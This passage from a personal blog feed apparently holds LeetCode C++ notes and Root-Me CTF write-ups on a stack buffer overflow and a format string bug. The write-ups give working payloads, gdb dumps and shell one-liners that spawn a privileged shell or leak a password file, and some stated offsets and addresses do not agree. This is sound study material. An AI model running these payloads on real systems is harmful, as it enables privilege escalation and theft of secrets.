&lt;h3 id=&quot;snprintf&quot;&gt;&lt;a href=&quot;#snprintf&quot; class=&quot;headerlink&quot; title=&quot;snprintf&quot;&gt;&lt;/a&gt;snprintf&lt;/h3&gt;&lt;p&gt;&lt;code&gt;snprintf&lt;/code&gt;— prints into a &lt;code&gt;string&lt;/code&gt; with length checking&lt;br&gt;(&lt;a href=&quot;https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html&quot;&gt;https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html&lt;/a&gt;)&lt;br&gt;snprintf（）函数应与sprintf（）等效，并增加了n参数，该参数指出s所指缓冲区的大小。&lt;br&gt;·如果n为零，则不写任何内容，而s可以为空指针。&lt;br&gt;·否则，将丢弃第n-1st之后的输出字节，而不是将其写入数组，并且在实际写入数组的字节的末尾写入一个空字节。&lt;br&gt;&lt;em&gt;也就是增加了限制&lt;/em&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>leetcode add two numbers</title>
    <link href="http://finsenty54.github.io/2020/11/29/leetcode-add-two-numbers/"/>
    <id>http://finsenty54.github.io/2020/11/29/leetcode-add-two-numbers/</id>
    <published>2020-11-29T08:18:58.000Z</published>
    <updated>2020-12-11T08:51:27.366Z</updated>
    
    <content type="html"><![CDATA[<h2 id="leetcode-add-two-numbers"><a href="#leetcode-add-two-numbers" class="headerlink" title="leetcode add two numbers"></a>leetcode add two numbers</h2><p>本题关于singly-linked list 单链表<br>链表是怎么链接在一起的？？怎么存储的？？</p><a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ListNode *<span class="title">Solution::addTwoNumbers</span><span class="params">(ListNode *l1, ListNode *l2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ListNode *answer = <span class="literal">nullptr</span>;</span><br><span class="line">    ListNode **curr = &amp;answer; <span class="comment">//指向指针的指针,一种间接寻址方式</span></span><br><span class="line">                               <span class="comment">//将answer的地址赋给curr,（64位）</span></span><br><span class="line">    ListNode *addr1 = l1;</span><br><span class="line">    ListNode *addr2 = l2;</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (addr1 != <span class="literal">nullptr</span> || addr2 != <span class="literal">nullptr</span> ||carry&gt;<span class="number">0</span>) <span class="comment">//do not use for()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr1!=<span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=addr1-&gt;val;</span><br><span class="line">            addr1=addr1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (addr2!=<span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=addr2-&gt;val;</span><br><span class="line">            addr2=addr2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=carry;</span><br><span class="line">        carry = sum / <span class="number">10</span>;</span><br><span class="line">        (*curr) = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>); <span class="comment">//每次新建一个node,不用取名</span></span><br><span class="line">        <span class="comment">//*curr 取得是curr地址中的64位内容，**curr 就要取两次地址中的内容</span></span><br><span class="line">        <span class="comment">//这是变量，这是把新建node的地址赋给answer,填满64位</span></span><br><span class="line">        <span class="comment">//https://www.runoob.com/cplusplus/cpp-pointer-to-pointer.html</span></span><br><span class="line">        curr = &amp;((*curr)-&gt;next); <span class="comment">//把next本身的地址赋给curr</span></span><br><span class="line">        <span class="comment">//-&gt; 相当于 *，跳转 取内容</span></span><br><span class="line">        sum=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方法：每次新建一个，匿名新建</p><hr><pre><code>ListNode *curr = nullptr; //指向指针的指针,一种间接寻址方式ListNode *answer = curr;</code></pre><p>这样赋值后，answer得到是nullptr</p><pre><code>ListNode *answer = nullptr;ListNode **curr = &amp;answer; //指向指针的指针,一种间接寻址方式</code></pre><p>这样赋值后，curr得到是answer本身的地址，而不是内容</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;leetcode-add-two-numbers&quot;&gt;&lt;a href=&quot;#leetcode-add-two-numbers&quot; class=&quot;headerlink&quot; title=&quot;leetcode add two numbers&quot;&gt;&lt;/a&gt;leetcode add two numbers&lt;/h2&gt;&lt;p&gt;本题关于singly-linked list 单链表&lt;br&gt;链表是怎么链接在一起的？？怎么存储的？？&lt;/p&gt;</summary>
    
    
    
    <category term="leetcode" scheme="http://finsenty54.github.io/categories/leetcode/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>leetcode 1 two sum</title>
    <link href="http://finsenty54.github.io/2020/11/26/leetcode-1-two-sum/"/>
    <id>http://finsenty54.github.io/2020/11/26/leetcode-1-two-sum/</id>
    <published>2020-11-26T08:35:52.000Z</published>
    <updated>2020-12-11T08:52:00.926Z</updated>
    
    <content type="html"><![CDATA[<p>leetcode 1 two sum</p><h3 id="学到的东西"><a href="#学到的东西" class="headerlink" title="学到的东西"></a>学到的东西</h3><h4 id="hash-table-哈希表"><a href="#hash-table-哈希表" class="headerlink" title="hash-table 哈希表"></a>hash-table 哈希表</h4><p>散列表<br>是根据键（Key）而直接访问在内存储存位置的数据结构</p><p>若关键字为k，则其值存放在f(k)的存储位置上。由此，不需比较便可直接取得所查记录。称这个对应关系f为散列函数，按这个思想建立的表为散列表。</p><a id="more"></a><p>例如知道值为3 ， 可以直接知道地址为2<br>地址index=H（key）</p><hr><h4 id="c-模板"><a href="#c-模板" class="headerlink" title="c++模板"></a>c++模板</h4><h4 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h4><p>向量（Vector）是一个封装了动态大小数组的顺序容器（Sequence Container）。</p><p>可以简单的认为，向量是一个能够存放任意类型的动态数组。</p><h4 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h4><p><a href="https://blog.csdn.net/qq_21997625/article/details/84672775">https://blog.csdn.net/qq_21997625/article/details/84672775</a></p><p><code>mymap.insert(make_pair(nums[i],i));</code><br>小技巧</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p><a href="https://github.com/Finsenty54/my_leetcode_cplusplus/blob/main/two_num_hash_map.cpp">https://github.com/Finsenty54/my_leetcode_cplusplus/blob/main/two_num_hash_map.cpp</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;leetcode 1 two sum&lt;/p&gt;
&lt;h3 id=&quot;学到的东西&quot;&gt;&lt;a href=&quot;#学到的东西&quot; class=&quot;headerlink&quot; title=&quot;学到的东西&quot;&gt;&lt;/a&gt;学到的东西&lt;/h3&gt;&lt;h4 id=&quot;hash-table-哈希表&quot;&gt;&lt;a href=&quot;#hash-table-哈希表&quot; class=&quot;headerlink&quot; title=&quot;hash-table 哈希表&quot;&gt;&lt;/a&gt;hash-table 哈希表&lt;/h4&gt;&lt;p&gt;散列表&lt;br&gt;是根据键（Key）而直接访问在内存储存位置的数据结构&lt;/p&gt;
&lt;p&gt;若关键字为k，则其值存放在f(k)的存储位置上。由此，不需比较便可直接取得所查记录。称这个对应关系f为散列函数，按这个思想建立的表为散列表。&lt;/p&gt;</summary>
    
    
    
    <category term="leetcode" scheme="http://finsenty54.github.io/categories/leetcode/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer overflow - basic</title>
    <link href="http://finsenty54.github.io/2020/11/24/Stack-buffer-overflow-basic/"/>
    <id>http://finsenty54.github.io/2020/11/24/Stack-buffer-overflow-basic/</id>
    <published>2020-11-24T13:29:57.000Z</published>
    <updated>2020-11-24T13:31:11.316Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x64-Stack-buffer-overflow-basic"><a href="#ELF-x64-Stack-buffer-overflow-basic" class="headerlink" title="ELF x64 - Stack buffer overflow - basic"></a>ELF x64 - Stack buffer overflow - basic</h2><p><em>gdb 内 查看函数</em></p><p><code>info functions</code></p><pre><code>0x0000000000401152  callMeMaybe0x0000000000401193  main</code></pre><a id="more"></a><hr><p>ret 后<br>会将rsp指向的内容压入RIP，转移程序执行流</p><hr><p>题目源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callMeMaybe</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[] = &#123; <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-p&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> len, i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    len = <span class="built_in">strlen</span>(buffer);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, buffer);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="主要思路："><a href="#主要思路：" class="headerlink" title="主要思路："></a>主要思路：</h3><p><a href="http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf">http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf</a><br>根据这篇文章<br>通过溢出来控制RIP，将其指向我们想要的函数</p><ol><li>先向buffer中输入字符，执行到<code>ret</code>时，查看<code>RSP</code>的值，确定需要多少位可以溢出到<code>RSP</code>位</li><li>可以确定需要<code>0x110</code> 即<code>280</code>位，之后添加的字符就会输入进<code>RIP</code>中</li><li>我们需要的是执行<code>callMeMaybe()</code>，所以将函数地址倒序添加进末尾（因为小端序）</li></ol><hr><h3 id="查看函数地址"><a href="#查看函数地址" class="headerlink" title="查看函数地址"></a>查看函数地址</h3><pre><code>[0x00401193]&gt; fs symbols;f0x00401000 23 sym._init0x00401070 42 entry00x00401070 43 sym._start0x004010a0 1 sym._dl_relocate_static_pie0x004010b0 33 sym.deregister_tm_clones0x004010e0 49 sym.register_tm_clones0x00401120 33 entry.fini00x00401120 0 sym.__do_global_dtors_aux0x00401150 2 entry.init00x00401150 0 sym.frame_dummy0x00401152 65 sym.callMeMaybe0x00401193 103 main0x00401193 103 sym.main</code></pre><h3 id="“a”-280-”B”-6"><a href="#“a”-280-”B”-6" class="headerlink" title="“a”*280+”B”*6"></a>“a”*280+”B”*6</h3><pre><code>gdb-peda$ x/290xb $rbp-0x1100x7fffffffdb80:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdb88:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdb90:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdb98:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdba0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdba8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbb0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbb8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbc0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbc8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbd0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbd8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbe0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbe8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbf0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbf8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc00:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc08:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc10:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc18:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc20:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc28:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc30:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc38:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc40:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc48:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc50:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc58:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc60:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc68:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc70:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc78:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc80:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc88:    0x61    0x61    0x61    0x61    0x1e    0x01    0x00    0x000x7fffffffdc90:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc98:    0x42    0x42    0x42    0x42    0x42    0x42    0x00    0x000x7fffffffdca0:    0x88    0xdd</code></pre><hr><p>成功控制RIP<br>RSP: 0x7fffffffdc98 –&gt; 0x424242424242 (‘BBBBBB’)<br>Invalid $PC address: 0x424242424242</p><p>最后的payload:<br><code>(python -c &#39;print &quot;A&quot; * 280  + &quot;\xe7\x05\x40\x00\x00\x00\x00\x00&quot;&#39; ; cat ) | ./ch35</code></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x64-Stack-buffer-overflow-basic&quot;&gt;&lt;a href=&quot;#ELF-x64-Stack-buffer-overflow-basic&quot; class=&quot;headerlink&quot; title=&quot;ELF x64 - Stack buffer overflow - basic&quot;&gt;&lt;/a&gt;ELF x64 - Stack buffer overflow - basic&lt;/h2&gt;&lt;p&gt;&lt;em&gt;gdb 内 查看函数&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;info functions&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x0000000000401152  callMeMaybe
0x0000000000401193  main&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Format string bug basic 1</title>
    <link href="http://finsenty54.github.io/2020/11/17/Format_string_bug_basic%201/"/>
    <id>http://finsenty54.github.io/2020/11/17/Format_string_bug_basic%201/</id>
    <published>2020-11-17T08:00:33.000Z</published>
    <updated>2020-11-17T08:01:53.892Z</updated>
    
    <content type="html"><![CDATA[<p>Z3::  big 表示大端序 即末尾放在高地址处 即顺序保持不变<br>地址：0x804810: – : 0x804820</p><h2 id="Exploit-writing-tutorial-part-1-Stack-Based-Overflows"><a href="#Exploit-writing-tutorial-part-1-Stack-Based-Overflows" class="headerlink" title="Exploit writing tutorial part 1 : Stack Based Overflows"></a><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" title="Exploit writing tutorial part 1 : Stack Based Overflows">Exploit writing tutorial part 1 : Stack Based Overflows</a></h2><p><code>ax</code> 16位<br><code>al</code> 8位</p><pre><code>mov     rax, [rbp+var_E0] ；rax=0xc8    0xdf    0xff    0xff    0xff    0x7fmov     rax, [rax] ; rax=0x7fffffffe2f4mov     [rbp+input], rax ;mov     rax, [rbp+input] ; rax=0x7fffffffe2f4mov     rdi, rax        ; scall    _strlen</code></pre><a id="more"></a><h3 id="寻找确定位置"><a href="#寻找确定位置" class="headerlink" title="寻找确定位置"></a>寻找确定位置</h3><p><code>msf-pattern_create -l 5000</code><br>At this time, eip contains <code>0x356b4234</code> (note : little endian : we have overwritten EIP with 34 42 6b 35 = <code>4Bk5</code></p><p><code>msf-pattern_offset 0x356b4234 5000</code><br>计算pattern 偏移值</p><p><code>1094</code>. That’s the <code>buffer length needed</code> to overwrite EIP. So if you create a file with <code>25000+1094 A’s</code>, and then add <code>4 B’s (42 42 42 42 in hex)</code><br><code>EIP</code> should contain <code>42 42 42 42</code>.</p><hr><h3 id="清理函数"><a href="#清理函数" class="headerlink" title="清理函数"></a>清理函数</h3><p>POP 出下一跳地址后， ESP 不是指向<code>”下一个栈地址“</code><br>·ESP从模式的第5个字符开始，而不是第一个字符。<br>·（由于调用约定，当将参数传递给子函数时，<code>子函数将清理父函数使用的堆栈空间</code>，所以造成ESP不是指向下一个栈地址）</p><hr><h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><p>将EIP 写为指向jmp esp的地址，shellcode写在esp指向的地址处</p><p>windbg::<br>s 01b10000 l 01fdd000 ff e4<br>search 在这之间寻找机器码为 <code>ff e4</code> 的指令</p><hr><h3 id="NULL-字节"><a href="#NULL-字节" class="headerlink" title="NULL 字节"></a>NULL 字节</h3><p>The <code>null byte</code> would become <code>a string terminator</code> and the<code> rest of the buffer data</code> will become <code>unusable</code>)</p><p>Alternatively, you can split up your shellcode in smaller ‘eggs’ and use a technique called ‘egg-hunting’ to reassemble the shellcode before executing it.</p><h2 id="ELF-x86-Format-string-bug-basic-1"><a href="#ELF-x86-Format-string-bug-basic-1" class="headerlink" title="ELF x86 - Format string bug basic 1"></a>ELF x86 - Format string bug basic 1</h2><p><a href="http://showlinkroom.me/2017/01/28/pwn-learn-printf/">http://showlinkroom.me/2017/01/28/pwn-learn-printf/</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">|   符号           |       作用               |</span><br><span class="line"><span class="selector-tag">-----------------------------------------------</span></span><br><span class="line">|    %d            |  十进制有符号整数         |</span><br><span class="line">|    %u            |  十进制无符号整数         |</span><br><span class="line">|    %f            |  浮点数                  |</span><br><span class="line">|    %s            |  字符串                  |</span><br><span class="line">|    %c            |  单个字符                |</span><br><span class="line">|    %p            |  指针的值                |</span><br><span class="line">|    %e            |  指数形式的浮点数         |</span><br><span class="line">|    %x            |  无符号以十六进制表示的整数|</span><br><span class="line">|    %o            |  无符号以八进制表示的整数  |</span><br><span class="line">|    %g            |  自动选择合适的表示法     |  </span><br><span class="line">|    %n            |  将printf之前已经输出的字符串个数赋给指定参数（此时参数提供地址）|</span><br></pre></td></tr></table></figure><hr><p>题目源码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">        FILE *secret = fopen(<span class="string">&quot;/challenge/app-systeme/ch5/.passwd&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span> buffer[<span class="number">32</span>];</span><br><span class="line">        fgets(buffer, <span class="keyword">sizeof</span>(buffer), secret);</span><br><span class="line">        <span class="built_in">printf</span>(argv[<span class="number">1</span>]);</span><br><span class="line">        fclose(secret);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><code>printf (&quot;%s%s%s%s%s%s%s%s%s%s%s%s&quot;);</code></p><p>Because <code>‘%s’</code> displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to readfrom anillegal address, which is not mapped.</p><pre><code>printf (&quot;Number %d has no address, number %d has: %08x\n&quot;, i, a, &amp;a);stack top. . .&lt;&amp;a&gt;&lt;a&gt;&lt;i&gt;A. . .stack bottom</code></pre><p><a href="https://imgchr.com/i/DVLAYV"><img src="https://s3.ax1x.com/2020/11/17/DVLAYV.png" alt="DVLAYV.png"></a></p><p>可以直接读栈里的内容</p><hr><h3 id="查看栈里的内容"><a href="#查看栈里的内容" class="headerlink" title="查看栈里的内容"></a>查看栈里的内容</h3><p><code>printf (&quot;%08x.%08x.%08x.%08x.%08x\n&quot;);</code><br>This works, because we instruct the <code>printf-</code>function to retrieve <code>five parameters</code> from the stack and display them as 8-digit padded hexadecimalnumbers. So a possible output may look like:<code>40012980.080628c4.bffff7a4.00000005.08059c04</code></p><h3 id="查看任意地址内容"><a href="#查看任意地址内容" class="headerlink" title="查看任意地址内容"></a>查看任意地址内容</h3><p>%s  string ((const) (unsigned) char *) reference<br>‘％s’参数恰好做到了，它显示了堆栈提供的地址中的内存。</p><p><a href="https://imgchr.com/i/DVLc6g"><img src="https://s3.ax1x.com/2020/11/17/DVLc6g.png" alt="DVLc6g.png"></a></p><hr><p>当我在GDB中执行fgets()的时候。<br>but if we try to debug the programm with GDB, we get a <code>permission denied</code> on the <code>fgets() call</code>…</p><pre><code>gdb-peda$ help telescope Display memory content at an address with smart dereferencesUsage:    telescope [linecount] (analyze at current $SP)    telescope address [linecount]</code></pre><hr><h3 id="大佬的方法"><a href="#大佬的方法" class="headerlink" title="大佬的方法"></a>大佬的方法</h3><pre><code>for i in `seq 1 20`; do ~/ch5 &quot;%$i&quot;&#39;$08X&#39; ; echo; done</code></pre><p>一次打印8个字节</p><pre><code>for i in `seq 1 2 20`; do ./ch5 &quot;%$i&quot;&#39;$08X&#39;&quot;%$((i+1))&quot;&#39;$08X&#39;; echo; done</code></pre><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Finally, we want to</span><br><span class="line">- convert to big endian, <span class="keyword">using</span> sed -r ’s/(..)(..)(..)(..)/\<span class="number">4</span>\<span class="number">3</span>\<span class="number">2</span>\<span class="number">1</span>/g’</span><br><span class="line">- convert the hexa to printable character, <span class="keyword">using</span> xxd -r -p</span><br><span class="line">- filter non-printable charaters, <span class="keyword">using</span> strings</span><br></pre></td></tr></table></figure><p>filtering only <code>13-or-more-bytes</code> strings (<code>strings -13</code>)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strings <span class="number">-13</span> &lt; &lt;(<span class="keyword">for</span> i in `seq <span class="number">1</span> <span class="number">20</span>`; \</span><br><span class="line">    do ~/ch5 &quot;%$i&quot;&#x27;$08X&#x27;&quot;%$((i+1))&quot;&#x27;$08X&#x27;&quot;%$((i+2))&quot;&#x27;$08X&#x27;&quot;%$((i+3))&quot;&#x27;$08X&#x27; \</span><br><span class="line">    |sed -r &#x27;s/(..)(..)(..)(..)/\4\3\2\1/g&#x27; \</span><br><span class="line">    |xxd -r -p; echo;  done)</span><br></pre></td></tr></table></figure><p>注：：</p><pre><code>┌─[zentreisender@parrotos]─[~/Documents]└──╼ $strings -hUsage: strings [option(s)] [file(s)] Display printable strings in [file(s)] (stdin by default)</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;Z3::  big 表示大端序 即末尾放在高地址处 即顺序保持不变&lt;br&gt;地址：0x804810: – : 0x804820&lt;/p&gt;
&lt;h2 id=&quot;Exploit-writing-tutorial-part-1-Stack-Based-Overflows&quot;&gt;&lt;a href=&quot;#Exploit-writing-tutorial-part-1-Stack-Based-Overflows&quot; class=&quot;headerlink&quot; title=&quot;Exploit writing tutorial part 1 : Stack Based Overflows&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/&quot; title=&quot;Exploit writing tutorial part 1 : Stack Based Overflows&quot;&gt;Exploit writing tutorial part 1 : Stack Based Overflows&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ax&lt;/code&gt; 16位&lt;br&gt;&lt;code&gt;al&lt;/code&gt; 8位&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mov     rax, [rbp+var_E0] ；rax=0xc8    0xdf    0xff    0xff    0xff    0x7f
mov     rax, [rax] ; rax=0x7fffffffe2f4
mov     [rbp+input], rax ;
mov     rax, [rbp+input] ; rax=0x7fffffffe2f4
mov     rdi, rax        ; s
call    _strlen&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer overflow basic 2</title>
    <link href="http://finsenty54.github.io/2020/11/14/Stack_buffer_overflow_basic_2/"/>
    <id>http://finsenty54.github.io/2020/11/14/Stack_buffer_overflow_basic_2/</id>
    <published>2020-11-14T03:08:34.000Z</published>
    <updated>2020-11-14T03:13:29.741Z</updated>
    
